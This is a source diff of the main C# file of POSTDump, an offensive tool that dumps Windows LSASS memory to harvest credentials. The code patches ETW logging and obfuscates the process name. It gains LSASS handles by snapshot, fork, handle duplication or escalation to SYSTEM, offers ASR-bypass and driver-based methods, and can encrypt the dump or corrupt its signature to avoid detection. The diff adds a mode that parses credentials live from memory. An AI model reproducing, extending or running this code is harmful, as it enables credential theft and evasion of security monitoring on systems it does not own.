@@ -1,15 +1,15 @@
 ﻿using System;
+using System.Linq;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Runtime.InteropServices;
 using Data = POSTMiniDump.Data;
-using Minidump = POSTMiniDump.MiniDump;
 using MinidumpUtils = POSTMiniDump.Utils;
+using System.IO;
 
 namespace POSTDump
 {
-    internal class Postdump
+    public class Postdump
     {
 
         public static ISyscall isyscall = new ISyscall();
@@ -20,23 +20,25 @@ namespace POSTDump
         static void Help()
         {
             Console.WriteLine(@"" +
-                "-e, --encrypt - Encrypt dump in-memory\n" +
-                "-s, --signature - Generate invalid Minidump signature\n" +
-                "-o, --outfile - Output file where to write dump\n" +
+                "--encrypt, -e - Encrypt dump in-memory\n" +
+                "--signature, -s - Generate invalid Minidump signature\n" +
+                "--outfile, -o - Output file where to write dump\n" +
                 "--snap - Use snapshot technic\n" +
                 "--fork - Use fork technic [default]\n" +
                 "--duplicate-elevate - Look for existing lsass handle to duplicate and elevate\n" +
                 "--elevate-handle - Open a handle to LSASS with low privileges and duplicate it to gain higher privileges\n" +
-                "--asr - Attempt LSASS dump using ASR bypass (win10/11/2019) (no signature/no encrypt)\n" +
-                "--driver - Use Process Explorer driver to open lsass handle (bypass PPL) and dump lsass\n" +
-                "--kill [processID] - Use Process Explorer driver to kill process and exit\n" +
-                "--help - Display help" +
+                "--live - Parse creds from memory without writing into file on disk\n" +
+                "--fromfile - Parse creds from dump file\n" + 
+                "--asr - Attempt LSASS dump using ASR bypass (no signature/encrypt available)\n" +
+                "--driver, -d - Use Process Explorer driver to open lsass handle and dump lsass\n" +
+                "--kill, -k [processID] - Use Process Explorer driver to kill process and exit\n" +
+                "--help, -h - Display help" +
                 "");
             return;
         }
+      
+        static void Main(string[] args) {
 
-        public static void Main(string[] args)
-        {
             string filename = System.Environment.MachineName + "_" + DateTime.Now.ToString("ddMMyyyy_HH-mm") + ".dmp";
             bool Encrypt = false;
             bool Signature = false;
@@ -44,17 +46,20 @@ namespace POSTDump
             bool driver = false;
             bool Kill = false;
             bool Asr = false;
+            bool Live = false;
+            bool fromfile = false;
+            string FileToParse = string.Empty;
             string Output = string.Empty;
             int processid = 0;
-            string tech = "fork";
+            string tech = "snapshot";
 
             foreach (string arg in args)
             {
-                if (arg.Equals("--signature") || arg.Equals("-s"))
+                if (arg.Equals("--signature"))
                 {
                     Signature = true;
                 }
-                if (arg.Equals("--encrypt") || arg.Equals("-e"))
+                if (arg.Equals("--encrypt"))
                 {
                     Encrypt = true;
                 }
@@ -74,7 +79,7 @@ namespace POSTDump
                 {
                     tech = "duplicate";
                 }
-                if (arg.Equals("--outfile") || arg.Equals("-o"))
+                if (arg.Equals("--outfile"))
                 {
                     int i = Array.IndexOf(args, arg);
                     Output = args[i + 1];
@@ -93,7 +98,17 @@ namespace POSTDump
                 {
                     Asr = true;
                 }
-                if (arg.Equals("--help"))
+                if (arg.Equals("--live"))
+                {
+                    Live = true;
+                }
+                if (arg.Equals("--fromfile"))
+                {
+                    fromfile = true;
+                    int i = Array.IndexOf(args, arg);
+                    FileToParse = args[i + 1];
+                }
+                if (arg.Equals("--help") || arg.Equals("-h"))
                 {
                     Help();
                     return;
@@ -107,17 +122,9 @@ namespace POSTDump
 
             isyscall.PatchETW();
 
-            if (Asr)
-            {
-                if (ASR.Run())
-                    Console.WriteLine("Done! Check for existing lsass.dmp file into current folder");
-
-                return;
-            }
-
             string ProcName = "l" + "sa" + "ss";
             Process proc = Process.GetProcessesByName(ProcName)[0];
-            int lsassid = proc.Id;
+            int pid = proc.Id;
 
             IntPtr procHandle = IntPtr.Zero;
             IntPtr dumpHandle = IntPtr.Zero;
@@ -125,8 +132,8 @@ namespace POSTDump
             uint desiredAccess = 0;
             bool successTech = false;
             bool successDump = false;
-            ulong region_size = Data.DUMP_MAX_SIZE;
 
+            ulong region_size = Data.DUMP_MAX_SIZE;
             Data.dump_context dc = new Data.dump_context();
             dc.DumpMaxSize = region_size;
             dc.BaseAddress = IntPtr.Zero;
@@ -135,7 +142,20 @@ namespace POSTDump
             dc.Version = Data.MINIDUMP_VERSION;
             dc.ImplementationVersion = Data.MINIDUMP_IMPL_VERSION;
 
-            if (processid > 0) 
+            if (fromfile)
+            {
+                Console.WriteLine("Parsing file " + FileToParse);
+                Minidump.Program.Main(dc.BaseAddress, dc.rva, FileToParse);
+                return;
+            }
+
+            if (Asr)
+            {
+                ASR.Run();
+                return;
+            }
+
+            if (processid > 0)
             {
                 if (!Process.GetProcesses().Any(x => x.Id == processid))
                 {
@@ -144,42 +164,42 @@ namespace POSTDump
                 }
                 if (Kill)
                 {
-                    Driver.Kill(processid, out dc.hProcess, false, false);
+                    Driver.Kill(processid, out dc.hProcess, false);
                     return;
                 }
-            }         
+            }
 
             if (driver)
             {
-                Driver.Kill(lsassid, out dc.hProcess, true, false);
+                Driver.Kill(0, out dc.hProcess, true);
             }
 
             //Allocate memory for dump
             IntPtr ntallocptr = isyscall.GetSyscallPtr("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory NTAVM = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntallocptr, typeof(NtAllocateVirtualMemory));
             Data.NTSTATUS status = NTAVM(new IntPtr(-1), ref dc.BaseAddress, IntPtr.Zero, ref region_size, 0x1000, 0x04); //MEM_COMMIT, PAGE_READWRITE
-            if (status != 0)
+            if (status != Data.NTSTATUS.Success)
             {
                 Console.WriteLine("Could not allocate memory for the dump!");
                 return;
             }
 
-
+            // Skip this part if driver technic used
             if (dc.hProcess == IntPtr.Zero)
             {
-                if (driver)
-                    Console.WriteLine("Driver technic failed, trying default method..");
-                
                 if (Elevate)
                 {
-                    if (!Handle.GetProcessHandle(lsassid, out procHandle, (uint)0x1000)) //PROCESS_QUERY_LIMITED_INFORMATION
+                    if (!Handle.GetProcessHandle(pid, out procHandle, (uint)0x1000)) //PROCESS_QUERY_LIMITED_INFORMATION
                     {
+                        //Console.WriteLine("Open process failed!2");
                         Console.WriteLine("Open process failed!");
                         return;
                     }
 
-                    if (!Handle.escalate_to_system())
+                    bool system = Handle.escalate_to_system();
+                    if (!system)
                     {
+                        //Console.WriteLine("GetSystem failed!");
                         Console.WriteLine("GetSystem failed!");
                         return;
                     }
@@ -198,15 +218,17 @@ namespace POSTDump
                         Console.WriteLine("Elevate handle failed.");
                         return;
                     }
+
+                    Console.WriteLine("Elevate handle success.");
                 }
 
                 if (tech == "snapshot")
                 {
                     if (!Elevate)
                     {
-                        if (!Handle.GetProcessHandle(lsassid, out dumpHandle, (uint)0x0400 | (uint)0x0080)) //PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS
+                        if (!Handle.GetProcessHandle(pid, out dumpHandle, (uint)0x0400 | (uint)0x0080)) //PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS
                         {
-                            Console.WriteLine("Getting lsass handle failed!");
+                            Console.WriteLine("Getting lsass handle using snapshot failed!");
                             return;
                         }
                     }
@@ -218,10 +240,13 @@ namespace POSTDump
                 {
                     if (!Elevate)
                     {
-                        if (!Handle.GetProcessHandle(lsassid, out dumpHandle, (uint)0x0080)) //PROCESS_CREATE_PROCESS
+                        if (!Handle.GetProcessHandle(pid, out dumpHandle, (uint)0x0400 | (uint)0x0080)) //PROCESS_CREATE_PROCESS
                         {
-                            Console.WriteLine("Getting lsass handle failed!");
-                            return;
+                            if (!Handle.GetProcessHandle(pid, out dumpHandle, (uint)0x1000 | (uint)0x0080)) //if fail, try with PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_CREATE_PROCESS
+                            {
+                                Console.WriteLine("Getting lsass handle using fork failed!");
+                                return;
+                            }
                         }
                     }
 
@@ -230,7 +255,7 @@ namespace POSTDump
 
                 else if (tech == "duplicate")
                 {
-                    List<IntPtr> hDupHandles = Handle.FindDupHandles((int)lsassid);
+                    List<IntPtr> hDupHandles = Handle.FindDupHandles((int)pid);
                     if (hDupHandles.Count == 0)
                     {
                         Console.WriteLine("No handle to duplicate found.");
@@ -244,7 +269,7 @@ namespace POSTDump
                     }
 
                     desiredAccess = 0x1000 | 0x0010; //PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ
-                    foreach(IntPtr hDuped in hDupHandles)
+                    foreach (IntPtr hDuped in hDupHandles)
                     {
                         if (Handle.ElevateHandle(hDuped, desiredAccess, 0, out dc.hProcess))
                         {
@@ -252,7 +277,7 @@ namespace POSTDump
                             Console.WriteLine("Elevate handle success.");
                             break;
                         }
-                    } 
+                    }
                 }
 
                 if (!successTech)
@@ -262,7 +287,14 @@ namespace POSTDump
                 }
             }
 
-            successDump = Minidump.POSTDumpWriteDump(dc, Signature, Encrypt);
+            if (dc.hProcess == IntPtr.Zero)
+            {
+                Console.WriteLine("Could not open a handle!");
+                return;
+            }
+            
+            successDump = POSTMiniDump.MiniDump.POSTDumpWriteDump(dc, Signature, Encrypt);
+
             if (!successDump)
             {
                 Console.WriteLine("Dump failed !");
@@ -273,28 +305,37 @@ namespace POSTDump
                 Console.WriteLine("Dump success !");
             }
 
-            var success = MinidumpUtils.WriteFile(Output, dc.BaseAddress, dc.rva, out IntPtr hFile);
-            if (success)
+            if (Live)
             {
-                Console.WriteLine($"Dump saved to {Output}");
-                if (Signature && Encrypt)
+                Minidump.Program.Main(dc.BaseAddress, dc.rva);
+            }
+            else
+            {
+                var success = MinidumpUtils.WriteFile(Output, dc.BaseAddress, dc.rva, out IntPtr hFile);
+                if (success)
                 {
-                    Console.WriteLine($"The dump has an invalid signature and is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type both");
-                }
-                else if (Signature)
-                {
-                    Console.WriteLine($"The dump has an invalid signature, to restore it run:\npython3 dump-restore.py {Output} --type restore");
-                }
-                else if (Encrypt)
-                {
-                    Console.WriteLine($"The dump is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type decrypt");
+                    Console.WriteLine($"Dump saved to {Output}");
+                    if (Signature && Encrypt)
+                    {
+                        Console.WriteLine($"The dump has an invalid signature and is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type both");
+                    }
+                    else if (Signature)
+                    {
+                        Console.WriteLine($"The dump has an invalid signature, to restore it run:\npython3 dump-restore.py {Output} --type restore");
+                    }
+                    else if (Encrypt)
+                    {
+                        Console.WriteLine($"The dump is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type decrypt");
+                    }
                 }
             }
-            
+
             Handle.cleanup(dc.hProcess, tech, snapHandle);
 
             if (dc.BaseAddress != IntPtr.Zero)
                 MinidumpUtils.erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+
+            return;
         }
     }
 }
